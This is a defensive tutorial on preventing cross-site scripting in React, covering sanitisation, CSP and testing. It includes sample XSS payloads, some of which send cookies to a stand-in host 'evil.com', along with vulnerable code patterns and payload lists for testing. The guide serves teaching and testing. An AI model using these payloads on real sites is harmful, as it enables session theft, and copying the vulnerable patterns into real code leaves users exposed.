# How to Prevent XSS Attacks in React Applications

Author: [nawazdhandala](https://github.com/nawazdhandala)

Tags: React, Security, XSS, OWASP, Frontend, Best Practices

Description: A comprehensive guide to understanding, identifying, and preventing Cross-Site Scripting (XSS) vulnerabilities in React applications with practical code examples and security best practices.

---

Cross-Site Scripting (XSS) remains one of the most prevalent and dangerous web security vulnerabilities, consistently ranking in the OWASP Top 10. While React provides some built-in protections against XSS attacks, developers often unknowingly introduce vulnerabilities through improper practices, dangerous APIs, or third-party integrations.

This guide will take you through everything you need to know about XSS in React applications: how attacks work, where vulnerabilities hide, and most importantly, how to build applications that are resilient against these attacks.

---

## What is XSS and Why Should You Care?

Cross-Site Scripting (XSS) is an injection attack where malicious scripts are injected into trusted websites. When a user visits the compromised page, the malicious script executes in their browser with the same privileges as legitimate code.

The consequences can be severe:

- **Session hijacking**: Attackers steal session cookies and impersonate users
- **Credential theft**: Fake login forms capture usernames and passwords
- **Keylogging**: Every keystroke is recorded and sent to attackers
- **Cryptocurrency mining**: User's browser mines crypto for attackers
- **Malware distribution**: Users are redirected to malicious downloads
- **Defacement**: Website content is altered to spread misinformation
- **Phishing**: Legitimate-looking content tricks users into revealing sensitive data

A single XSS vulnerability can compromise your entire user base. In 2024, XSS vulnerabilities accounted for over 30% of all web application security issues reported in bug bounty programs.

---

## The Three Types of XSS Attacks

Understanding the different types of XSS is crucial for effective prevention.

### 1. Stored XSS (Persistent)

The most dangerous type. Malicious scripts are permanently stored on the target server (in databases, comment fields, user profiles, etc.) and served to every user who views the infected content.

**Attack scenario:**
```javascript
// Attacker submits this as a comment
const maliciousComment = `
  Great article! <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
  </script>
`;
```

Every user who views this comment will have their cookies stolen.

### 2. Reflected XSS (Non-Persistent)

The malicious script is embedded in a URL or form submission and reflected back to the user. The payload is not stored but delivered through a crafted link.

**Attack scenario:**
```
https://yourapp.com/search?q=<script>alert(document.cookie)</script>
```

If the search query is rendered without sanitization, the script executes.

### 3. DOM-Based XSS

The vulnerability exists entirely in client-side code. The malicious payload never reaches the server but manipulates the DOM directly.

**Attack scenario:**
```javascript
// Vulnerable code
const hash = window.location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello, ' + hash;

// Attack URL
https://yourapp.com/#<img src=x onerror=alert(document.cookie)>
```

---

## React's Built-in XSS Protection

React provides automatic protection against many XSS vectors through JSX escaping. Understanding what React protects and what it does not is essential.

### What React Escapes Automatically

When you render content using JSX curly braces, React automatically escapes potentially dangerous characters:

```jsx
function UserGreeting({ userName }) {
  // Safe - React escapes the content
  return <div>Hello, {userName}!</div>;
}

// If userName = "<script>alert('XSS')</script>"
// React renders: Hello, &lt;script&gt;alert('XSS')&lt;/script&gt;!
```

React converts dangerous characters to their HTML entities:

| Character | HTML Entity |
|-----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

### What React Does NOT Protect

React's automatic escaping does not cover all scenarios. These are the danger zones:

1. **dangerouslySetInnerHTML**
2. **URL attributes (href, src, etc.)**
3. **Event handlers with dynamic content**
4. **Server-side rendering edge cases**
5. **Third-party libraries and components**

---

## XSS Vulnerability Vectors in React

Let us examine each vulnerability vector in detail with examples of both vulnerable and secure code.

### Vector 1: dangerouslySetInnerHTML

This is the most obvious and commonly exploited XSS vector in React.

**Vulnerable Code:**
```jsx
function BlogPost({ content }) {
  // DANGEROUS - Never use with untrusted content
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

**Attack payload:**
```html
<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Secure Code:**
```jsx
import DOMPurify from 'dompurify';

function BlogPost({ content }) {
  // Sanitize HTML before rendering
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
}
```

**Even Better - Use a Markdown Parser:**
```jsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

function BlogPost({ markdownContent }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        // Customize link rendering for security
        a: ({ node, ...props }) => (
          <a {...props} target="_blank" rel="noopener noreferrer" />
        ),
      }}
    >
      {markdownContent}
    </ReactMarkdown>
  );
}
```

### Vector 2: URL-Based Attacks (href, src, formAction)

React does NOT sanitize URL attributes. JavaScript URLs and data URIs can execute code.

**Vulnerable Code:**
```jsx
function UserProfile({ website }) {
  // DANGEROUS - User-controlled URL
  return <a href={website}>Visit Website</a>;
}
```

**Attack payloads:**
```javascript
// JavaScript protocol
"javascript:alert(document.cookie)"

// Data URI (in some contexts)
"data:text/html,<script>alert('XSS')</script>"
```

**Secure Code:**
```jsx
function UserProfile({ website }) {
  const sanitizeUrl = (url) => {
    if (!url) return '#';

    try {
      const parsed = new URL(url);
      // Only allow http and https protocols
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        return '#';
      }
      return parsed.href;
    } catch {
      // If URL parsing fails, it's not a valid URL
      return '#';
    }
  };

  return (
    <a
      href={sanitizeUrl(website)}
      target="_blank"
      rel="noopener noreferrer"
    >
      Visit Website
    </a>
  );
}
```

**Comprehensive URL Sanitizer:**
```jsx
const SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|sms):|[^&:/?#]*(?:[/?#]|$))/gi;

function sanitizeUrl(url) {
  if (!url || typeof url !== 'string') {
    return 'about:blank';
  }

  const trimmedUrl = url.trim();

  if (trimmedUrl.match(SAFE_URL_PATTERN)) {
    return trimmedUrl;
  }

  return 'about:blank';
}

// Usage
function SafeLink({ href, children }) {
  return (
    <a
      href={sanitizeUrl(href)}
      target="_blank"
      rel="noopener noreferrer nofollow"
    >
      {children}
    </a>
  );
}
```

### Vector 3: Dynamic Event Handlers

Never construct event handlers from user input.

**Vulnerable Code:**
```jsx
function DynamicButton({ onClickAction }) {
  // DANGEROUS - User-controlled event handler
  return <button onClick={new Function(onClickAction)}>Click Me</button>;
}

// Or with eval
function DangerousHandler({ action }) {
  const handleClick = () => {
    eval(action); // NEVER do this
  };
  return <button onClick={handleClick}>Execute</button>;
}
```

**Secure Code:**
```jsx
function SafeButton({ actionType, actionData }) {
  const handleClick = () => {
    // Use a predefined action map
    const actions = {
      'navigate': () => window.location.href = sanitizeUrl(actionData),
      'alert': () => showNotification(actionData),
      'submit': () => submitForm(actionData),
    };

    const action = actions[actionType];
    if (action) {
      action();
    }
  };

  return <button onClick={handleClick}>Click Me</button>;
}
```

### Vector 4: Ref-Based DOM Manipulation

Direct DOM manipulation bypasses React's protection.

**Vulnerable Code:**
```jsx
function UserContent({ content }) {
  const divRef = useRef(null);

  useEffect(() => {
    // DANGEROUS - Direct innerHTML assignment
    divRef.current.innerHTML = content;
  }, [content]);

  return <div ref={divRef} />;
}
```

**Secure Code:**
```jsx
import DOMPurify from 'dompurify';

function UserContent({ content }) {
  const divRef = useRef(null);

  useEffect(() => {
    // Sanitize before DOM manipulation
    const clean = DOMPurify.sanitize(content);
    divRef.current.innerHTML = clean;
  }, [content]);

  return <div ref={divRef} />;
}

// Better - Avoid direct DOM manipulation entirely
function UserContentBetter({ content }) {
  const sanitizedContent = useMemo(
    () => DOMPurify.sanitize(content),
    [content]
  );

  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
}
```

### Vector 5: Server-Side Rendering (SSR) Vulnerabilities

SSR introduces additional attack surfaces.

**Vulnerable Code (Next.js example):**
```jsx
// pages/profile/[username].js
export async function getServerSideProps({ params }) {
  // User-controlled data from URL
  return {
    props: {
      username: params.username, // Could contain XSS payload
    },
  };
}

function ProfilePage({ username }) {
  // Even with React's escaping, some edge cases exist
  return (
    <html>
      <head>
        <title>Profile: {username}</title> {/* Could be exploited */}
      </head>
      <body>
        <h1>Welcome, {username}</h1>
      </body>
    </html>
  );
}
```

**Secure Code:**
```jsx
import { encode } from 'html-entities';

export async function getServerSideProps({ params }) {
  // Validate and sanitize on the server
  const username = params.username
    .replace(/[<>'"&]/g, '') // Remove dangerous characters
    .substring(0, 50); // Limit length

  return {
    props: {
      username: encode(username),
    },
  };
}

function ProfilePage({ username }) {
  return (
    <html>
      <head>
        <title>{`Profile: ${username}`}</title>
      </head>
      <body>
        <h1>Welcome, {username}</h1>
      </body>
    </html>
  );
}
```

### Vector 6: Third-Party Component Vulnerabilities

External libraries can introduce XSS if not carefully vetted.

**Vulnerable Pattern:**
```jsx
// Using an unvetted rich text editor
import SketchyEditor from 'random-npm-package';

function CommentForm() {
  const [content, setContent] = useState('');

  return (
    <SketchyEditor
      value={content}
      onChange={setContent}
      // May not sanitize output properly
    />
  );
}
```

**Secure Pattern:**
```jsx
// Use well-maintained, security-audited libraries
import { Editor } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';
import DOMPurify from 'dompurify';

function SecureCommentForm() {
  const editor = useEditor({
    extensions: [StarterKit],
    content: '',
  });

  const handleSubmit = () => {
    const html = editor.getHTML();
    // Always sanitize output, even from trusted editors
    const cleanHtml = DOMPurify.sanitize(html);
    submitComment(cleanHtml);
  };

  return (
    <>
      <EditorContent editor={editor} />
      <button onClick={handleSubmit}>Submit</button>
    </>
  );
}
```

### Vector 7: JSON Data Injection

Embedding user data in JSON can create XSS vectors.

**Vulnerable Code:**
```jsx
function DataPage({ userData }) {
  return (
    <html>
      <body>
        <div id="root"></div>
        <script>
          {/* DANGEROUS - User data in script tag */}
          window.__DATA__ = {JSON.stringify(userData)};
        </script>
      </body>
    </html>
  );
}
```

**Attack payload:**
```javascript
// If userData contains:
{ "name": "</script><script>alert('XSS')</script>" }
```

**Secure Code:**
```jsx
function DataPage({ userData }) {
  // Escape script-breaking characters
  const safeJson = JSON.stringify(userData)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/'/g, '\\u0027');

  return (
    <html>
      <body>
        <div id="root"></div>
        <script
          dangerouslySetInnerHTML={{
            __html: `window.__DATA__ = ${safeJson};`
          }}
        />
      </body>
    </html>
  );
}
```

### Vector 8: CSS Injection

CSS can be weaponized for data exfiltration.

**Vulnerable Code:**
```jsx
function StyledComponent({ userColor }) {
  // DANGEROUS - User-controlled CSS
  return (
    <div style={{ backgroundColor: userColor }}>
      Content
    </div>
  );
}
```

**Attack payload:**
```css
/* Data exfiltration via CSS */
red; background-image: url('https://evil.com/steal?data=sensitive');

/* Or using CSS expressions (older IE) */
expression(alert('XSS'))
```

**Secure Code:**
```jsx
const ALLOWED_COLORS = ['red', 'blue', 'green', 'yellow', 'purple', 'orange'];

function StyledComponent({ userColor }) {
  // Validate against allowlist
  const safeColor = ALLOWED_COLORS.includes(userColor)
    ? userColor
    : 'gray';

  return (
    <div style={{ backgroundColor: safeColor }}>
      Content
    </div>
  );
}

// For hex colors
function validateHexColor(color) {
  const hexRegex = /^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/;
  return hexRegex.test(color) ? color : '#cccccc';
}
```

---

## Implementing DOMPurify: Best Practices

DOMPurify is the gold standard for HTML sanitization. Here is how to use it effectively.

### Basic Setup

```bash
npm install dompurify
npm install --save-dev @types/dompurify  # For TypeScript
```

### Configuration Options

```jsx
import DOMPurify from 'dompurify';

// Strict configuration for user comments
const commentConfig = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target', 'rel'], // Will add these to allowed tags
  FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
};

// Configure link security
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer nofollow');
  }
});

function sanitizeComment(html) {
  return DOMPurify.sanitize(html, commentConfig);
}
```

### Creating a Reusable Sanitization Hook

```jsx
import { useMemo } from 'react';
import DOMPurify from 'dompurify';

const DEFAULT_CONFIG = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'class'],
  ALLOW_DATA_ATTR: false,
};

export function useSanitizedHTML(dirtyHTML, config = DEFAULT_CONFIG) {
  return useMemo(() => {
    if (!dirtyHTML) return '';
    return DOMPurify.sanitize(dirtyHTML, config);
  }, [dirtyHTML, config]);
}

// Usage
function RichContent({ html }) {
  const cleanHTML = useSanitizedHTML(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

### Server-Side Sanitization (Node.js)

```javascript
// DOMPurify requires a DOM - use jsdom on the server
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

export function serverSanitize(html) {
  return purify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: [],
  });
}
```

---

## Content Security Policy (CSP)

CSP is your last line of defense. Even if XSS bypasses other protections, a strong CSP can prevent script execution.

### Implementing CSP in React

**Next.js (next.config.js):**
```javascript
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'nonce-{nonce}';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self';
      connect-src 'self' https://api.yourapp.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    `.replace(/\s{2,}/g, ' ').trim()
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
    ];
  },
};
```

**Express.js Middleware:**
```javascript
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.yourapp.com"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  })
);
```

### Using Nonces for Inline Scripts

```jsx
// Generate nonce per request
import { randomBytes } from 'crypto';

export function generateNonce() {
  return randomBytes(16).toString('base64');
}

// In your document component
function Document({ nonce }) {
  return (
    <html>
      <head>
        <meta
          httpEquiv="Content-Security-Policy"
          content={`script-src 'self' 'nonce-${nonce}';`}
        />
      </head>
      <body>
        <script nonce={nonce} src="/main.js"></script>
      </body>
    </html>
  );
}
```

---

## Input Validation Strategies

Defense in depth requires validating input at multiple layers.

### Client-Side Validation

```jsx
import { z } from 'zod';

// Define strict schemas
const userInputSchema = z.object({
  username: z.string()
    .min(3)
    .max(30)
    .regex(/^[a-zA-Z0-9_-]+$/, 'Invalid characters'),
  email: z.string().email(),
  bio: z.string()
    .max(500)
    .transform(val => val.replace(/[<>]/g, '')), // Strip angle brackets
  website: z.string()
    .url()
    .refine(
      url => url.startsWith('https://'),
      'Only HTTPS URLs allowed'
    )
    .optional(),
});

function ProfileForm() {
  const [errors, setErrors] = useState({});

  const handleSubmit = (formData) => {
    const result = userInputSchema.safeParse(formData);

    if (!result.success) {
      setErrors(result.error.flatten().fieldErrors);
      return;
    }

    // Proceed with validated data
    submitProfile(result.data);
  };

  return (/* form JSX */);
}
```

### Server-Side Validation (Always Required)

```javascript
// Express.js with express-validator
import { body, validationResult } from 'express-validator';

const validateUserInput = [
  body('username')
    .trim()
    .isLength({ min: 3, max: 30 })
    .matches(/^[a-zA-Z0-9_-]+$/)
    .escape(),
  body('email')
    .isEmail()
    .normalizeEmail(),
  body('bio')
    .optional()
    .trim()
    .isLength({ max: 500 })
    .escape(),
  body('website')
    .optional()
    .isURL({ protocols: ['https'], require_protocol: true }),
];

app.post('/api/profile', validateUserInput, (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }

  // Process validated input
});
```

---

## Testing for XSS Vulnerabilities

### Automated Testing

```javascript
// Jest test suite for XSS prevention
import { render, screen } from '@testing-library/react';
import { sanitizeHtml, sanitizeUrl } from './sanitizers';
import UserContent from './UserContent';

const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<a href="javascript:alert(\'XSS\')">click</a>',
  '<div onmouseover="alert(\'XSS\')">hover</div>',
  '"><script>alert("XSS")</script>',
  '\';alert(String.fromCharCode(88,83,83))//\';',
  '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<video><source onerror="alert(\'XSS\')">',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert("XSS")>',
];

describe('XSS Prevention', () => {
  describe('sanitizeHtml', () => {
    XSS_PAYLOADS.forEach((payload) => {
      it(`should neutralize: ${payload.substring(0, 50)}...`, () => {
        const result = sanitizeHtml(payload);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('onload');
        expect(result).not.toContain('javascript:');
      });
    });
  });

  describe('sanitizeUrl', () => {
    it('should block javascript: URLs', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBe('about:blank');
    });

    it('should allow https: URLs', () => {
      expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
    });

    it('should block data: URLs', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('about:blank');
    });
  });

  describe('UserContent component', () => {
    XSS_PAYLOADS.forEach((payload) => {
      it(`should safely render: ${payload.substring(0, 30)}...`, () => {
        render(<UserContent content={payload} />);

        // Verify no script elements
        expect(document.querySelectorAll('script').length).toBe(0);

        // Verify no dangerous event handlers
        const allElements = document.querySelectorAll('*');
        allElements.forEach((el) => {
          expect(el.getAttribute('onerror')).toBeNull();
          expect(el.getAttribute('onload')).toBeNull();
          expect(el.getAttribute('onclick')).toBeNull();
        });
      });
    });
  });
});
```

### Manual Testing Checklist

Use these payloads during penetration testing:

```javascript
const MANUAL_TEST_PAYLOADS = {
  // Basic script injection
  basic: '<script>alert(document.domain)</script>',

  // Event handlers
  imgError: '<img src=x onerror=alert(1)>',
  svgLoad: '<svg/onload=alert(1)>',
  bodyLoad: '<body onload=alert(1)>',

  // Attribute injection
  attrBreakout: '" onfocus="alert(1)" autofocus="',

  // Protocol handlers
  jsProtocol: 'javascript:alert(1)',
  dataUri: 'data:text/html,<script>alert(1)</script>',

  // Encoding bypass
  htmlEntity: '&lt;script&gt;alert(1)&lt;/script&gt;',
  urlEncode: '%3Cscript%3Ealert(1)%3C/script%3E',
  unicodeEscape: '\u003cscript\u003ealert(1)\u003c/script\u003e',

  // Template injection
  template: '${alert(1)}',

  // CSS-based
  cssExpression: 'expression(alert(1))',
  cssUrl: 'url(javascript:alert(1))',
};
```

---

## Security Libraries and Tools

### Essential Libraries

| Library | Purpose | Installation |
|---------|---------|--------------|
| DOMPurify | HTML sanitization | `npm install dompurify` |
| xss | HTML filtering | `npm install xss` |
| validator | Input validation | `npm install validator` |
| helmet | Security headers | `npm install helmet` |
| zod | Schema validation | `npm install zod` |
| sanitize-url | URL sanitization | `npm install @braintree/sanitize-url` |

### Security Scanning Tools

| Tool | Type | Usage |
|------|------|-------|
| npm audit | Dependency scanning | `npm audit` |
| Snyk | Vulnerability scanning | `snyk test` |
| OWASP ZAP | Penetration testing | Automated scanning |
| Burp Suite | Security testing | Manual testing |
| ESLint security plugins | Static analysis | `eslint-plugin-security` |

### ESLint Security Configuration

```javascript
// .eslintrc.js
module.exports = {
  plugins: ['security', 'react'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'warn',
    'security/detect-unsafe-regex': 'error',
    'security/detect-eval-with-expression': 'error',
    'react/no-danger': 'warn',
    'react/no-danger-with-children': 'error',
  },
};
```

---

## Security Checklist for React Applications

Use this checklist for every React project:

### Code Review Checklist

- [ ] No usage of `dangerouslySetInnerHTML` without sanitization
- [ ] All user-controlled URLs validated before use in `href` or `src`
- [ ] No `eval()`, `new Function()`, or `setTimeout/setInterval` with string arguments
- [ ] No direct DOM manipulation with user content via refs
- [ ] All third-party rich text editors output sanitized HTML
- [ ] JSON data embedded in HTML properly escaped
- [ ] CSS values from user input validated or restricted
- [ ] Server-side rendering properly escapes all dynamic content

### Infrastructure Checklist

- [ ] Content Security Policy headers configured
- [ ] X-Content-Type-Options set to nosniff
- [ ] X-Frame-Options set to DENY or SAMEORIGIN
- [ ] HTTPS enforced across all resources
- [ ] Cookies have HttpOnly and Secure flags
- [ ] SameSite cookie attribute configured

### Testing Checklist

- [ ] Automated XSS payload tests in CI/CD pipeline
- [ ] Regular penetration testing with updated payload lists
- [ ] Dependency vulnerability scanning enabled
- [ ] Security-focused code review for all PRs touching user input

---

## XSS Prevention Summary Table

| Attack Vector | Risk Level | Prevention Method | Code Example |
|---------------|------------|-------------------|--------------|
| `dangerouslySetInnerHTML` | Critical | DOMPurify sanitization | `DOMPurify.sanitize(html)` |
| `href` with user input | High | URL validation/allowlist | `sanitizeUrl(userUrl)` |
| `src` with user input | High | URL validation/allowlist | `validateImageUrl(url)` |
| Event handlers | Critical | Never use user input | Use action maps |
| Ref DOM manipulation | High | Sanitize before insertion | `DOMPurify.sanitize()` |
| SSR data injection | High | Escape special characters | `encodeURIComponent()` |
| JSON in HTML | Medium | Escape `<>/&'` | Custom escaper |
| CSS injection | Medium | Validate/allowlist values | Regex validation |
| Third-party libs | Variable | Audit and sanitize output | Security review |
| Template strings | Medium | Avoid user input in templates | Use parameterization |

---

## Real-World Example: Secure Comment System

Here is a complete implementation of a secure comment system:

```jsx
// components/Comments/CommentForm.jsx
import { useState } from 'react';
import { z } from 'zod';
import DOMPurify from 'dompurify';

const commentSchema = z.object({
  content: z.string()
    .min(1, 'Comment cannot be empty')
    .max(5000, 'Comment too long')
    .transform(val => DOMPurify.sanitize(val, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code'],
      ALLOWED_ATTR: ['href'],
    })),
  authorName: z.string()
    .min(2)
    .max(50)
    .regex(/^[a-zA-Z0-9\s_-]+$/, 'Invalid characters in name'),
});

export function CommentForm({ onSubmit }) {
  const [content, setContent] = useState('');
  const [authorName, setAuthorName] = useState('');
  const [errors, setErrors] = useState({});

  const handleSubmit = async (e) => {
    e.preventDefault();

    const result = commentSchema.safeParse({ content, authorName });

    if (!result.success) {
      setErrors(result.error.flatten().fieldErrors);
      return;
    }

    await onSubmit(result.data);
    setContent('');
    setErrors({});
  };

  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label htmlFor="authorName">Name</label>
        <input
          id="authorName"
          type="text"
          value={authorName}
          onChange={(e) => setAuthorName(e.target.value)}
          maxLength={50}
        />
        {errors.authorName && <span className="error">{errors.authorName}</span>}
      </div>

      <div>
        <label htmlFor="content">Comment</label>
        <textarea
          id="content"
          value={content}
          onChange={(e) => setContent(e.target.value)}
          maxLength={5000}
        />
        {errors.content && <span className="error">{errors.content}</span>}
      </div>

      <button type="submit">Post Comment</button>
    </form>
  );
}

// components/Comments/CommentDisplay.jsx
import DOMPurify from 'dompurify';
import { useMemo } from 'react';

// Configure DOMPurify for display
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer nofollow');
  }
});

const DISPLAY_CONFIG = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
};

export function CommentDisplay({ comment }) {
  const sanitizedContent = useMemo(
    () => DOMPurify.sanitize(comment.content, DISPLAY_CONFIG),
    [comment.content]
  );

  // Escape author name (plain text, no HTML)
  const safeAuthorName = comment.authorName
    .replace(/[<>&"']/g, (char) => ({
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '"': '&quot;',
      "'": '&#x27;',
    }[char]));

  return (
    <article className="comment">
      <header>
        <span className="author">{safeAuthorName}</span>
        <time dateTime={comment.createdAt}>
          {new Date(comment.createdAt).toLocaleDateString()}
        </time>
      </header>
      <div
        className="content"
        dangerouslySetInnerHTML={{ __html: sanitizedContent }}
      />
    </article>
  );
}
```

---

## Conclusion

XSS prevention in React is not a single technique but a comprehensive strategy:

1. **Understand React's limits**: Auto-escaping only covers JSX text content
2. **Sanitize HTML**: Use DOMPurify for any HTML rendering
3. **Validate URLs**: Block dangerous protocols like `javascript:`
4. **Validate all input**: On both client and server
5. **Implement CSP**: Your last line of defense
6. **Test continuously**: Automated and manual testing with known payloads
7. **Keep dependencies updated**: Vulnerabilities are discovered constantly

Security is not a feature you add at the end. It is a mindset that influences every line of code. By following these practices, you can build React applications that protect your users and your reputation.

---

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [React Security Best Practices](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)

---

Have questions about securing your React application? The OneUptime community is here to help. Drop in with your security questions or share your own hardening strategies.
